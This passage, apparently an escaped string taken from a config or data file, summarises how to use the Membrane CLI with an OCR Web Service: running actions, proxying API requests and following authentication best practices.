      \ specific action, the command is:\n- **Command:** `membrane action run --connectionId=CONNECTION_ID ACTION_ID --json`\
      \  \nParameters can be passed in JSON format using:\n- **Command:** `membrane action run --connectionId=CONNECTION_ID\
      \ ACTION_ID --json --input \"{ \\\"key\\\": \\\"value\\\" }\"`\n\n### Proxying Requests\n\nIf pre-defined actions do\
      \ not meet user needs, direct requests can be made to the OCR Web Service API via Membrane’s proxy:\n- **Command:**\
      \ `membrane request CONNECTION_ID /path/to/endpoint`\nA range of options can be specified to modify the request, including\
      \ HTTP method, headers, data payloads, and parameters via options flags.\n\n### Best Practices\n\nThe documentation\
      \ emphasizes several best practices:\n- Rely on Membrane for interactions with external applications to leverage its\
      \ built-in error handling, security, and token management features.\n- Explore available actions before attempting to\
      \ create new API calls to save development time and prevent common mistakes.\n- Avoid asking users for API keys or credentials\
      \ by managing authentication through Membrane directly.\n\nOverall, the OCR Web Service provides an encapsulated environment\
      \ for efficiently handling image text extraction with robust support for ease of integration and security handling."
